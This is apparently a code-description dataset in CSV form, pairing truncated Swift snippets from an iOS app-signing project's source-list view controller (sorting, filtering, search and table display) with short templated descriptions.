id,language,folder,code_type,file_path,nl,code
3309,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","MARK: - Actions","@objc func closeSheet() {
dismiss(animated: true)
}
}
"
3310,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","MARK: - SortOption","enum SortOption: String, Codable {
case `default`
case name
case date
}

// MARK: - SourceAppViewController

class SourceAppViewController: UITableViewController {"
3311,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","MARK: - SourceAppViewController","class SourceAppViewController: UITableViewController {
// MARK: - Properties

var newsData: [NewsData] = []
var apps: [StoreAppsData] = []
var oApps: [StoreAppsData] = []
var filteredApps: [StoreAppsData] = []

var name: String? { didSet { title = name } }"
3312,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","MARK: - Lifecycle","override func viewDidLoad() {
super.viewDidLoad()
setupNavigation()
setupSearchController()
setupViews()
loadAppsData()
}

// MARK: - Setup Methods
"
3313,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","MARK: - Setup Methods","fileprivate func setupViews() {
tableView.dataSource = self
tableView.delegate = self
tableView.tableHeaderView = UIView()
tableView.register(AppTableViewCell.self, forCellReuseIdentifier: ""AppTableViewCell"")
navigationItem.titleView = activityIndicator
activityIndicator.startAnimating()
}

private func setupHeader() {"
3314,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","Function setupHeader - sets upheader","private func setupHeader() {
guard uri.count == 1, !newsData.isEmpty else { return }"
3315,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","Function setupNavigation - sets upnavigation","fileprivate func setupNavigation() {
navigationItem.largeTitleDisplayMode = .never
}

// MARK: - Filter Menu

private func updateFilterMenu() {"
3316,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","MARK: - Filter Menu","private func updateFilterMenu() {
let filterMenu = UIMenu(
title: String.localized(""SOURCES_CELLS_ACTIONS_FILTER_TITLE""),
children: createSubSortMenu()
)
let filterButton = UIBarButtonItem(
image: UIImage(systemName: ""line.3.horizontal.decrease""),
menu: filterMenu
)
"
3317,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","Function createSubSortMenu - creates subsortmenu","private func createSubSortMenu() -> [UIMenuElement] {
let sortByDAction = createSortAction(
title: String.localized(""SOURCES_CELLS_ACTIONS_FILTER_BY_DEFAULT""),
sortOption: .default
)
let sortByNameAction = createSortAction(
title: String.localized(""SOURCES_CELLS_ACTIONS_FILTER_BY_NAME""),
sortOption: .name
)
let sortBySizeAction = createSortAction("
3318,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","Function createSortAction - creates sortaction","private func createSortAction(title: String, sortOption: SortOption) -> UIAction {
return UIAction(
title: title,
image: arrowImage(for: sortOption),
identifier: UIAction.Identifier(""sort\(title)""),
state: Preferences.currentSortOption == sortOption ? .on : .off,
handler: { [weak self] _ in"
3319,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","Function handleSortOptionSelected - implements handlesortoptionselected functionality","private func handleSortOptionSelected(_ sortOption: SortOption) {
if Preferences.currentSortOption == sortOption {"
3320,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","/ Arrow images for Sort options","func arrowImage(for sortOption: SortOption) -> UIImage? {
let isAscending = Preferences.currentSortOptionAscending
let imageName = isAscending ? ""chevron.up"" : ""chevron.down""
return sortOption == Preferences.currentSortOption ? UIImage(systemName: imageName) : nil
}

func updateSortOrderImage(for sortOption: SortOption) {"
3321,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","Function updateSortOrderImage - updates sortorderimage","func updateSortOrderImage(for sortOption: SortOption) {
guard let sortActionsGroup = sortActionsGroup else {"
3322,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","MARK: - Filtering & Sorting","func applyFilter() {
let sortOption = Preferences.currentSortOption
let ascending = Preferences.currentSortOptionAscending

switch sortOption {"
3323,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","Function sortAppsByDate - implements sortappsbydate functionality","private func sortAppsByDate(ascending: Bool) -> [StoreAppsData] {
return apps.sorted { app1, app2 in"
3324,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","Function reloadTableWithAnimation - implements reloadtablewithanimation functionality","private func reloadTableWithAnimation() {
UIView.transition(
with: tableView,
duration: 0.3,
options: .transitionCrossDissolve,
animations: { self.tableView.reloadData() }"
3325,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","MARK: - App Filtering","private func shouldFilter() -> StoreAppsData? {
guard let name = highlightAppName,
let id = highlightBundleID,
let version = highlightVersion,
let desc = highlightDescription
else {"
3326,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","Function filterApps - implements filterapps functionality","private func filterApps(
from apps: [StoreAppsData],
name: String,
id: String,
version: String,
desc: String,
devname: String?
) -> [StoreAppsData] {"
3327,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","MARK: - Data Loading","private func loadAppsData() {
guard let urls = uri else { return }"
3328,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","Function fetchDataFromURL - implements fetchdatafromurl functionality","private func fetchDataFromURL(
_ uri: URL,
completion: @escaping ([StoreAppsData], [NewsData], String, String) -> Void
) {"
3329,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","Function processLoadedAppData - implements processloadedappdata functionality","private func processLoadedAppData(
allApps: [StoreAppsData],
newsData: [NewsData],
website: String,
tintColor: String
) {"
3330,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","Function applyTintColor - implements applytintcolor functionality","private func applyTintColor(_ tintColor: String) {
if !tintColor.isEmpty {"
3331,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","Function filterAppsIfNeeded - implements filterappsifneeded functionality","private func filterAppsIfNeeded() {
if let filteredApp = shouldFilter() {"
3332,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","Function setupWebsiteTitleMenu - sets upwebsitetitlemenu","private func setupWebsiteTitleMenu(website: String) {
guard uri.count == 1, !website.isEmpty else { return }"
3333,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","Function finishLoading - implements finishloading functionality","private func finishLoading() {
UIView.transition(
with: tableView,
duration: 0.3,
options: .transitionCrossDissolve,
animations: {"
3334,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","MARK: - UITableViewDataSource & UITableViewDelegate","extension SourceAppViewController {
override func tableView(_: UITableView, numberOfRowsInSection _: Int) -> Int {"
3335,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, numberOfRowsInSection _: Int) -> Int {
return isFiltering ? filteredApps.count : apps.count
}

override func tableView(_: UITableView, heightForRowAt indexPath: IndexPath) -> CGFloat {"
3336,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, heightForRowAt indexPath: IndexPath) -> CGFloat {
let app = isFiltering ? filteredApps[indexPath.row] : apps[indexPath.row]

if let screenshotURLs = app.screenshotURLs,
!screenshotURLs.isEmpty,
Preferences.appDescriptionAppearence != 2
{"
3337,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
let cell = AppTableViewCell(style: .subtitle, reuseIdentifier: ""RoundedBackgroundCell"")
let app = isFiltering ? filteredApps[indexPath.row] : apps[indexPath.row]

// Configure cell
configureCell(cell, with: app, at: indexPath)

return cell
}
"
3338,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","Function configureCell - implements configurecell functionality","private func configureCell(_ cell: AppTableViewCell, with app: StoreAppsData, at indexPath: IndexPath) {
cell.configure(with: app)
cell.selectionStyle = .none
cell.backgroundColor = .clear

// Configure button
cell.getButton.tag = indexPath.row
cell.getButton.addTarget(self, action: #selector(getButtonTapped(_:)), for: .touchUpInside)

// Add long press gesture"
3339,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","Function tableView - implements tableview functionality","override func tableView(
_: UITableView,
contextMenuConfigurationForRowAt indexPath: IndexPath,
point _: CGPoint
) -> UIContextMenuConfiguration? {"
3340,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","Function createContextMenu - creates contextmenu","private func createContextMenu(for app: StoreAppsData) -> UIMenu {
// Create version actions
let versionActions = app.versions?.map { version in"
3341,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, titleForHeaderInSection _: Int) -> String? {
if isFiltering || apps.isEmpty || (highlightAppName != nil) {"
3342,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","MARK: - Search Controller","extension SourceAppViewController: UISearchControllerDelegate, UISearchBarDelegate {
func setupSearchController() {"
3343,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","Function setupSearchController - sets upsearchcontroller","func setupSearchController() {
searchController = UISearchController(searchResultsController: nil)
searchController.obscuresBackgroundDuringPresentation = false
searchController.hidesNavigationBarDuringPresentation = true
searchController.searchResultsUpdater = self
searchController.delegate = self
searchController.searchBar.placeholder = String.localized(""SOURCES_APP_VIEW_CONTROLLER_SEARCH_APPS"")

if highlightAppName == nil {"
3344,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","MARK: - UISearchResultsUpdating","extension SourceAppViewController: UISearchResultsUpdating {
func updateSearchResults(for searchController: UISearchController) {"
3345,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","Function updateSearchResults - updates searchresults","func updateSearchResults(for searchController: UISearchController) {
let searchText = searchController.searchBar.text ?? """"
filterContentForSearchText(searchText)
tableView.reloadData()
}

private func filterContentForSearchText(_ searchText: String) {"
3346,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","Function filterContentForSearchText - implements filtercontentforsearchtext functionality","private func filterContentForSearchText(_ searchText: String) {
let lowercasedSearchText = searchText.lowercased()

filteredApps = apps.filter { app in"
